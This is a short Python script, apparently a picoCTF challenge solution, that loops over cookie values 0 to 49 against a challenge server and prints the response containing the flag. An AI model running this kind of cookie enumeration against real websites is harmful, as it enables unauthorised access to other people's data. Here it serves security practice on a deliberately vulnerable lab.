import requests

for i in range(50):
    
    headers = {'Cookie': f'name={i}'}
    r = requests.get('http://mercury.picoctf.net:27177/check', headers=headers)
    if (r.status_code == 200) and ('picoCTF' in r.text):
        print(r.text)